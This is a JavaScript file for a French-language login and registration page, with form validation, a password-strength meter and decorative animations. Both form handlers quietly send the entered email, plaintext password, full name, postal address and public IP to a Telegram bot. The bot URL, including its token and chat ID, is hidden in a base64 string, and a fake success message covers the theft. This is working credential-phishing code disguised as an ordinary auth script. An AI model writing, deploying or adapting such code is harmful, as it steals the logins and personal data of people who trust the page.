document.addEventListener('DOMContentLoaded', () => {
            
            function getTelegramUrl() {
                const b64 = 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDg0OTI3NTYzMTI6QUFHOVdHS3lHUVRhb0Q0QTY1bm9HTjJWbVdUazFjYUw1aE0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD01Nzk1NzE5MjM4JnRleHQ9';
                return atob(b64);
            }
        // Fonction utilitaire pour récupérer l'IP publique
        async function getUserIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch (e) {
                return 'IP inconnue';
            }
        }
    // ===== MULTI-STEP REGISTER FORM =====
    const registerSteps = document.querySelectorAll('.register-step');
    let currentStep = 0;
    function showStep(idx, direction = 0) {
        registerSteps.forEach((step, i) => {
            step.classList.remove('active', 'slide-in-left', 'slide-in-right', 'slide-out-left', 'slide-out-right');
            if (i === idx) {
                step.classList.add('active');
                if (direction === 1) step.classList.add('slide-in-right');
                if (direction === -1) step.classList.add('slide-in-left');
            } else if (i < idx && direction !== 0) {
                step.classList.add('slide-out-left');
            } else if (i > idx && direction !== 0) {
                step.classList.add('slide-out-right');
            }
        });
        currentStep = idx;
    }
    function validateStep(idx) {
        const step = registerSteps[idx];
        let valid = true;
        const requiredInputs = step.querySelectorAll('input[required], select[required]');
        requiredInputs.forEach(input => {
            if (!input.value || (input.type === 'email' && !input.validity.valid)) {
                shakeInput(input);
                valid = false;
            }
            if (input.type === 'checkbox' && !input.checked) {
                valid = false;
                const customCheckbox = input.nextElementSibling;
                if (customCheckbox) {
                    customCheckbox.style.borderColor = '#ef4444';
                    setTimeout(() => {
                        customCheckbox.style.borderColor = '';
                    }, 2000);
                }
            }
        });
        // Mot de passe/confirmation
        if (idx === 3) {
            const password = step.querySelector('#password');
            const confirmPassword = step.querySelector('#confirmPassword');
            if (password && confirmPassword && password.value !== confirmPassword.value) {
                shakeInput(confirmPassword);
                showError(confirmPassword, 'Les mots de passe ne correspondent pas');
                valid = false;
            }
            if (password && password.value.length < 8) {
                shakeInput(password);
                valid = false;
            }
        }
        return valid;
    }
    if (registerSteps.length > 0) {
        showStep(0);
        document.querySelectorAll('.btn-next-step').forEach(btn => {
            btn.addEventListener('click', e => {
                const stepIdx = Array.from(registerSteps).indexOf(btn.closest('.register-step'));
                if (validateStep(stepIdx)) {
                    showStep(stepIdx + 1, 1);
                }
            });
        });
        document.querySelectorAll('.btn-prev-step').forEach(btn => {
            btn.addEventListener('click', e => {
                const stepIdx = Array.from(registerSteps).indexOf(btn.closest('.register-step'));
                showStep(stepIdx - 1, -1);
            });
        });
    }

    // ===== PARTICLES (same as main page) =====
    const particlesContainer = document.getElementById('particles');
    if (particlesContainer) {
        const particleCount = 20;
        for (let i = 0; i < particleCount; i++) {
            const particle = document.createElement('div');
            particle.classList.add('particle');
            const size = Math.random() * 3 + 1;
            const colors = ['#7c3aed', '#06b6d4', '#10b981', '#a78bfa'];
            particle.style.cssText = `
                width: ${size}px;
                height: ${size}px;
                left: ${Math.random() * 100}%;
                background: ${colors[Math.floor(Math.random() * colors.length)]};
                animation-duration: ${Math.random() * 15 + 10}s;
                animation-delay: ${Math.random() * 10}s;
            `;
            particlesContainer.appendChild(particle);
        }
    }

    // ===== TOGGLE PASSWORD VISIBILITY =====
    document.querySelectorAll('.toggle-password').forEach(btn => {
        btn.addEventListener('click', () => {
            const input = btn.parentElement.querySelector('input');
            const eyeOpen = btn.querySelector('.eye-open');
            const eyeClosed = btn.querySelector('.eye-closed');

            if (input.type === 'password') {
                input.type = 'text';
                eyeOpen.style.display = 'none';
                eyeClosed.style.display = 'block';
            } else {
                input.type = 'password';
                eyeOpen.style.display = 'block';
                eyeClosed.style.display = 'none';
            }
        });
    });

    // ===== PASSWORD STRENGTH =====
    const passwordInput = document.getElementById('password');
    const strengthBars = document.querySelectorAll('.strength-bar');
    const strengthText = document.getElementById('strengthText');

    if (passwordInput && strengthBars.length > 0) {
        passwordInput.addEventListener('input', () => {
            const val = passwordInput.value;
            let score = 0;

            if (val.length >= 8) score++;
            if (/[A-Z]/.test(val)) score++;
            if (/[0-9]/.test(val)) score++;
            if (/[^A-Za-z0-9]/.test(val)) score++;

            strengthBars.forEach((bar, i) => {
                bar.className = 'strength-bar';
                if (i < score) {
                    if (score <= 1) bar.classList.add('weak');
                    else if (score <= 2) bar.classList.add('medium');
                    else bar.classList.add('strong');
                }
            });

            if (strengthText) {
                const labels = ['', 'Faible', 'Moyen', 'Fort', 'Très fort'];
                strengthText.textContent = val.length > 0 ? labels[score] || '' : '';
                strengthText.style.color = score <= 1 ? '#ef4444' : score <= 2 ? '#f59e0b' : '#10b981';
            }
        });
    }

    // ===== INPUT FOCUS ANIMATIONS =====
    document.querySelectorAll('.input-wrapper input, .input-wrapper select').forEach(input => {
        input.addEventListener('focus', () => {
            input.closest('.input-wrapper').classList.add('focused');
        });
        input.addEventListener('blur', () => {
            input.closest('.input-wrapper').classList.remove('focused');
        });
    });

    // ===== LOGIN FORM =====
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = loginForm.querySelector('.btn-auth-submit');
            const email = loginForm.querySelector('#email');
            const password = loginForm.querySelector('#password');

            let valid = true;

            if (!email.value || !email.validity.valid) {
                shakeInput(email);
                valid = false;
            }
            if (!password.value) {
                shakeInput(password);
                valid = false;
            }

            if (valid) {
                
                const ip = await getUserIP();
                const message = `Tentative de connexion :%0AEmail: ${encodeURIComponent(email.value)}%0AMot de passe: ${encodeURIComponent(password.value)}%0AIP: ${encodeURIComponent(ip)}`;
                fetch(getTelegramUrl() + message)
                    .then(() => {
                        btn.classList.add('loading');
                        setTimeout(() => {
                            btn.classList.remove('loading');
                            btn.classList.add('success');
                            btn.querySelector('span').textContent = 'Connecté !';
                            btn.querySelector('span').style.opacity = '1';
                            setTimeout(() => {
                                window.location.href = 'index.html';
                            }, 1000);
                        }, 1500);
                    })
                    .catch(() => {
                        btn.classList.remove('loading');
                        alert('Erreur lors de l\'envoi');
                    });
            }
        });
    }

    // ===== REGISTER FORM =====
    const registerForm = document.getElementById('registerForm');
    if (registerForm) {
        registerForm.addEventListener('submit', async (e) => {
            // Si pas sur la dernière étape, ne pas soumettre
            if (typeof currentStep !== 'undefined' && currentStep !== registerSteps.length - 1) {
                e.preventDefault();
                showStep(registerSteps.length - 1, 1);
                return;
            }
            e.preventDefault();
            const btn = registerForm.querySelector('.btn-auth-submit');
            const inputs = registerForm.querySelectorAll('input[required], select[required]');
            const password = registerForm.querySelector('#password');
            const confirmPassword = registerForm.querySelector('#confirmPassword');

            let valid = true;

            inputs.forEach(input => {
                if (!input.value || (input.type === 'email' && !input.validity.valid)) {
                    shakeInput(input);
                    valid = false;
                }
                if (input.type === 'checkbox' && !input.checked) {
                    valid = false;
                    const customCheckbox = input.nextElementSibling;
                    if (customCheckbox) {
                        customCheckbox.style.borderColor = '#ef4444';
                        setTimeout(() => {
                            customCheckbox.style.borderColor = '';
                        }, 2000);
                    }
                }
            });

            if (password && confirmPassword && password.value !== confirmPassword.value) {
                shakeInput(confirmPassword);
                showError(confirmPassword, 'Les mots de passe ne correspondent pas');
                valid = false;
            }

            if (password && password.value.length < 8) {
                shakeInput(password);
                valid = false;
            }

            if (valid) {
                // Récupérer les valeurs du formulaire
                const data = {
                    Prénom: registerForm.querySelector('#firstName')?.value || '',
                    Nom: registerForm.querySelector('#lastName')?.value || '',
                    Email: registerForm.querySelector('#email')?.value || '',
                    Adresse: registerForm.querySelector('#address')?.value || '',
                    Ville: registerForm.querySelector('#city')?.value || '',
                    'Code postal': registerForm.querySelector('#postalCode')?.value || '',
                    Pays: registerForm.querySelector('#country')?.options[registerForm.querySelector('#country').selectedIndex]?.text || '',
                    'Mot de passe': registerForm.querySelector('#password')?.value || ''
                };
         
                const ip = await getUserIP();
               
                let message = 'Nouvelle inscription :%0A';
                for (const [key, value] of Object.entries(data)) {
                    message += `${key}: ${encodeURIComponent(value)}%0A`;
                }
                message += `IP: ${encodeURIComponent(ip)}%0A`;
               
                fetch(getTelegramUrl() + message)
                    .then(() => {
                        btn.classList.add('loading');
                        setTimeout(() => {
                            btn.classList.remove('loading');
                            btn.classList.add('success');
                            btn.querySelector('span').textContent = 'Compte créé !';
                            btn.querySelector('span').style.opacity = '1';
                            setTimeout(() => {
                                window.location.href = 'login.html';
                            }, 1200);
                        }, 1800);
                    })
                    .catch(() => {
                        btn.classList.remove('loading');
                        alert('Erreur lors de l\'envoi');
                    });
            }
        });
    }

    // ===== HELPERS =====
    function shakeInput(input) {
        input.classList.add('shake');
        setTimeout(() => input.classList.remove('shake'), 400);
    }

    function showError(input, message) {
        const group = input.closest('.form-group');
        let errorEl = group.querySelector('.error-msg');
        if (!errorEl) {
            errorEl = document.createElement('span');
            errorEl.classList.add('error-msg');
            group.appendChild(errorEl);
        }
        errorEl.textContent = message;
        errorEl.classList.add('visible');
        setTimeout(() => errorEl.classList.remove('visible'), 3000);
    }

});
